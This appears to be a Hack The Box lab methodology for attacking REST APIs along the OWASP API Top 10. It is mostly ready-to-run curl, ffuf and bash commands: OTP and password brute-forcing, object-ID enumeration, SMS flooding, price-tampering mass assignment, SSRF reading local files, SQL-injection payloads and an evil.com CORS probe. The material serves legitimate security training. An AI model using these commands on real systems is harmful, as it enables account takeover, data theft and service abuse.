# Attacking REST APIs — Methodology

Covers the OWASP API Security Top 10 (2023). Built from HTB API Attacks module.

---

## Phase 0: Recon & Enumeration (Every Session)

### 1. Fingerprint the server
```bash
curl -si http://<TARGET>/swagger | grep -i "server:"
```

### 2. Enumerate all endpoints from Swagger JSON
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep '"/api/'
```

### 3. Check for legacy API versions
```bash
curl -s http://<TARGET>/swagger/v0/swagger.json | python3 -m json.tool | grep '"/api/'
```
Look for a "Select a definition" dropdown in Swagger UI — v0 often has no auth and exposes deleted data.

### 4. Authenticate and capture JWT
**Customer:**
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
```
**Supplier:**
```bash
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
```
Always use command substitution — never paste a JWT directly into a variable.

### 5. Check roles
```bash
curl -s 'http://<TARGET>/api/v1/roles/current-user' -H "Authorization: Bearer $JWT" | jq
```
Role names map directly to endpoint names (e.g., `Suppliers_GetAll` → `GET /api/v1/suppliers`). No roles = BFLA candidate.

### 6. Get schema for any endpoint
```bash
curl -s http://<TARGET>/swagger/v1/swagger.json | python3 -m json.tool | grep -A 30 "<CommandName>"
```

---

## Attack Decision Tree

```
Got credentials → authenticate → check roles
│
├─ Has roles with {ID} parameter in endpoint → test BOLA
├─ Has roles with POST/PATCH endpoint → check for Mass Assignment
├─ Has roles with GET endpoint → check for Excessive Data Exposure
├─ Has roles with count/search endpoint → test SQL Injection
├─ Has roles with file URI field (products, certificates) → test SSRF
├─ No roles or few roles → test BFLA (try all collection GET endpoints)
│
└─ After enumerating v1 endpoints → check v0 for Inventory Management
```

---

## API1: BOLA (Broken Object Level Authorization)

**Indicators:** Role ends in `ByID`, endpoint has `{ID}` path parameter.

### Attack
```bash
cat > /tmp/bola.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/suppliers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
for ((i=1; i<=20; i++)); do
  echo "=== ID $i ==="
  curl -s "http://<TARGET>/api/v1/<endpoint>/$i" -H "Authorization: Bearer $JWT" | jq
done
EOF
bash /tmp/bola.sh
```

**What to look for:** Any response that returns another user's data. Flag often in fields like `commentsFromManager`.

---

## API2: Broken Authentication

**Indicators:** Login/OTP/password-reset endpoints with no rate limiting.

### OTP brute-force (4-digit)
```bash
curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/email-otps' -H 'Content-Type: application/json' -d '{"Email":"<TARGET_EMAIL>"}' | jq
```
Immediately follow with:
```bash
ffuf -X POST -u 'http://<TARGET>/api/v1/authentication/customers/passwords/resets' -H 'Content-Type: application/json' -d '{"Email":"<TARGET_EMAIL>","OTP":"FUZZ","NewPassword":"NewP@ssw0rd1"}' -w <(seq -w 0 9999):FUZZ -t 10 -mr '"SuccessStatus"\s*:\s*true'
```

### Password brute-force
```bash
ffuf -w /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-10000.txt:PASS -u 'http://<TARGET>/api/v1/authentication/customers/sign-in' -X POST -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"PASS"}' -fr "Invalid Credentials" -t 100
```

**After takeover:** Hit `current-user` endpoints — they need no role, just a valid JWT.
```bash
curl -s 'http://<TARGET>/api/v1/customers/payment-options/current-user' -H "Authorization: Bearer $JWT" | jq
```

---

## API3: Broken Object Property Level Authorization

### Excessive Data Exposure
**Indicators:** GET endpoint returns more fields than the user's role should allow.

```bash
curl -s 'http://<TARGET>/api/v1/<endpoint>' -H "Authorization: Bearer $JWT" | jq
```
Read ALL fields — flag often in `email`, `passwordHash`, or internal fields.

### Mass Assignment
**Indicators:** POST/PATCH endpoint schema contains server-computed fields (price, totals, status, fee exemptions).

1. Get the full schema: `grep -A 30 "<CommandName>"`
2. Look for fields like `NetSum`, `Price`, `IsExempted`, `Status`
3. Send with `NetSum: 0` or `Price: 0`:
```bash
curl -s -X POST 'http://<TARGET>/api/v1/customers/orders/items' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"OrderID":"<ID>","OrderItems":[{"ProductID":"<ID>","Quantity":1,"NetSum":0}]}' | jq
```

---

## API4: Unrestricted Resource Consumption

**Indicators:** Unauthenticated or low-privilege endpoint that triggers a resource (OTP, SMS, file write) with no rate limit.

```bash
cat > /tmp/spam.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
for i in $(seq 1 100); do
  response=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/passwords/resets/sms-otps' -H 'Content-Type: application/json' -d '{"Email":"<VALID_CUSTOMER_EMAIL>"}')
  echo "Request $i: $response"
  echo "$response" | grep -q "HTB{" && echo "FLAG on request $i!" && break
done
EOF
bash /tmp/spam.sh
```

Known valid customer emails: `MasonJenkins@ymail.com`, `htbpentesterN@hackthebox.com`

---

## API5: Broken Function Level Authorization (BFLA)

**Indicators:** User has no roles or very few roles. Distinct from BOLA — the user shouldn't be calling the endpoint at all.

```bash
cat > /tmp/bfla.sh << 'EOF'
JWT=$(curl -s -X POST 'http://<TARGET>/api/v1/authentication/customers/sign-in' -H 'Content-Type: application/json' -d '{"Email":"<EMAIL>","Password":"<PASS>"}' | jq -r '.jwt')
ENDPOINTS=("/api/v1/supplier-companies" "/api/v1/supplier-companies/yearly-reports" "/api/v1/suppliers" "/api/v1/suppliers/quarterly-reports" "/api/v1/products" "/api/v1/products/discounts" "/api/v1/customers" "/api/v1/customers/payment-options" "/api/v1/customers/orders" "/api/v1/customers/billing-addresses")
for ep in "${ENDPOINTS[@]}"; do
  echo "=== $ep ==="
  curl -s "http://<TARGET>${ep}" -H "Authorization: Bearer $JWT" | jq -c '.' | head -c 300
  echo
done
EOF
bash /tmp/bfla.sh
```

BFLA endpoints return real data. Secured endpoints return an auth error. Read ALL fields — flag often in a data field like `street`.

---

## API6: Unrestricted Access to Sensitive Business Flows

**Indicators:** BFLA or BOLA gives access to data that enables business abuse (discount schedules, competitor pricing, PII).

Usually chained with BFLA — filter the exposed data for a specific record:
```bash
curl -s 'http://<TARGET>/api/v1/customers/billing-addresses' -H "Authorization: Bearer $JWT" | jq '.customersBillingAddresses[] | select(.customerID == "<ID>")'
```

---

## API7: Server Side Request Forgery (SSRF)

**Indicators:** Supplier role includes `UploadPhoto` or `UploadCertificate` + `Update` — endpoints that store a file URI and serve back the file.

### Attack chain (products photo — confirmed working)
```bash
# 1. Get supplier ID
curl -s 'http://<TARGET>/api/v1/suppliers/current-user' -H "Authorization: Bearer $JWT" | jq

# 2. Create a product
curl -s -X POST 'http://<TARGET>/api/v1/products/current-user' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"NewProduct":{"Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"NotProvidedYet"}}' | jq

# 3. PATCH file URI to target file
curl -s -X PATCH 'http://<TARGET>/api/v1/products' -H 'Content-Type: application/json' -H "Authorization: Bearer $JWT" -d '{"UpdatedProduct":{"ProductID":"<PRODUCT_ID>","SupplierID":"<SUPPLIER_ID>","Name":"TestProduct","Price":10.0,"PNGPhotoFileURI":"file:///etc/flag.conf"}}' | jq

# 4. Read file contents (base64)
curl -s 'http://<TARGET>/api/v1/products/<PRODUCT_ID>/photo' -H "Authorization: Bearer $JWT" | jq -r '.base64Data' | base64 -d
```

**File URI format:** `file:///etc/flag.conf` — must start with `file://` and end with `.conf` or `.pdf` to pass validation.

---

## API8: Security Misconfiguration

### SQL Injection
**Indicators:** Role ends in `ByNameSubstring` or `Count` — endpoint takes a string parameter.

```bash
# Test for injection (trailing apostrophe returns error)
curl -s "http://<TARGET>/api/v1/suppliers/a'/count" -H "Authorization: Bearer $JWT" | jq

# Get total table count
curl -s "http://<TARGET>/api/v1/suppliers/a'%20OR%201=1%20--/count" -H "Authorization: Bearer $JWT" | jq
```

### CORS Misconfiguration
Always test with an `Origin` header — CORS headers only appear when triggered:
```bash
curl -si 'http://<TARGET>/api/v1/suppliers/a/count' -H "Authorization: Bearer $JWT" -H "Origin: http://evil.com" | grep -i "access-control"
```
Misconfigured: `Access-Control-Allow-Origin: *`

---

## API9: Improper Inventory Management

**Indicators:** Swagger UI has a version dropdown (v0, v1, v2).

```bash
# v0 endpoints — no auth required
curl -s 'http://<TARGET>/api/v0/customers/deleted' | jq
curl -s 'http://<TARGET>/api/v0/suppliers/deleted' | jq
curl -s 'http://<TARGET>/api/v0/supplier-companies/deleted' | jq

# Filter by ID (v0 uses uppercase field names: ID not id)
curl -s 'http://<TARGET>/api/v0/supplier-companies/deleted' | jq '.[] | select(.ID == "<ID>")'

# Filter by name
curl -s 'http://<TARGET>/api/v0/suppliers/deleted' | jq '.[] | select(.Name == "<NAME>")'
```

---

## API10: Unsafe Consumption of APIs

**Indicators:** One API version ingests data from another (v1 pulls from v0). The v0 data contains sensitive fields (password hashes) that propagate into v1.

Check the v0 deleted endpoints for sensitive fields like `PasswordHash` — if v1 ingests this data unsafely, those hashes would appear in v1 responses.

---

## Universal Rules

- **JWT:** Always use command substitution. Never paste raw JWT. Re-authenticate if any command returns empty output.
- **Scripts:** Write loops to `/tmp/script.sh`, run with `bash`. Never paste multi-line loops directly.
- **Responses:** Always pipe through `| jq`. Read ALL fields before acting — flags appear in unexpected places.
- **Error messages:** Read them — they reveal required field names and command type names.
- **current-user endpoints:** Require only a valid JWT, no role. Always try them first after any account access.
- **CORS:** Always send `Origin: http://evil.com` to check CORS policy — headers only appear when triggered.
